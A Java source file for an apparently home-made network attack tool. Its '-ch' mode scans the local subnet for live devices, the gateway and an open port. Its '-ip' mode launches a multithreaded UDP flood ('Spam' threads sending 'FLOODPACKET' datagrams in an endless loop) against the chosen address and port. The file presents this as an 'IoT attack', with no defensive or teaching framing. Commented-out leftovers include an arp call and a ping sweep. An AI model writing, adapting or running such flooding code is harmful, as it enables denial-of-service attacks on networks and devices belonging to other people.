package org.example;/*
package org.example;*/
/*
package org.example;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class Main {
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("arp -a");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));

            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
*/
import org.apache.commons.net.util.SubnetUtils;
import org.apache.commons.net.util.SubnetUtils.SubnetInfo;

import java.io.IOException;
import java.net.*;
import java.sql.SQLOutput;

public class Main {
    private static volatile boolean IS_ACTIVE = true;

    public static void main(String[] args) throws IOException, InterruptedException {
        if(args.length<1){
            System.out.println("Invalid arguments!\nTry:" +
                    "\n-ch : necessary data" +
                    "\n-ip <IP> -p <open port> : IoT attack on IP via open port");
        }else{
            switch (args[0]){
                case "-ch"-> check();
                case "-ip"-> executeAttack(args);
            }
        }
    }
    public static void executeAttack(String[] args) throws UnknownHostException {
        String defaultGateway = args[1];
        int openPort = Integer.parseInt(args[3]);
        int optimalThreadNumber = LoadSynchronization.getThreadsValue();
        attackIoT(optimalThreadNumber, defaultGateway, openPort);
    }
    public static void check() throws IOException, InterruptedException {
        String ipRange = DevicePool.getLocalIp();
        String defaultGateway = DevicePool.getDefaultGateway();
        System.out.println("Processing IP range...\n"+ ipRange);
        System.out.println("Address of LAN: " + defaultGateway);
        System.out.println("Processing connected devices:");
        DevicePool.printDevices(DevicePool.getLocalDevicesList(ipRange));
        System.out.println("Processing open ports...");
        PortChecking portChecking = new PortChecking(defaultGateway);
        int openPort = portChecking.getOpenPort();
        System.out.println("Open port: " + openPort);
        System.out.println("Recommended parameters for IoT attack: \n-ip " + defaultGateway + " -p " + openPort);
    }
    public static void attackIoT(int optimalThreadNumber, String defaultGateway, int port) throws UnknownHostException {
        System.out.println("Starting IoT attack with in " + optimalThreadNumber + " threads!!!\nIn order to stop attack - close the process!!!");
        for(int i =0; i<optimalThreadNumber; i++){
            new Thread(new Spam(defaultGateway, port)).start();
        }
    }

    static class Spam implements Runnable {
        InetAddress inetAddress;
        int port;
        public Spam(String inetAddress, int port) throws UnknownHostException {
            this.inetAddress = InetAddress.getByName(inetAddress);
            this.port = port;
        }
        @Override
        public void run() {
            try {
                DatagramSocket datagramSocket = new DatagramSocket();
                String message = "FLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKETFLOODPACKET";
                byte[] bytes = message.getBytes();
                DatagramPacket datagramPacket = new DatagramPacket(bytes, bytes.length, inetAddress, port);
                while (IS_ACTIVE) {
                    datagramSocket.send(datagramPacket);
                }
            } catch (SocketException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }
    }
}
/*



for (String ip : subnetInfo.getAllAddresses()) {
            try {
                InetAddress address = InetAddress.getByName(ip);
                if (address.isReachable(1000)) {
                    System.out.println("Device found at IP: " + ip);
                }
            } catch (UnknownHostException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    }
}*/



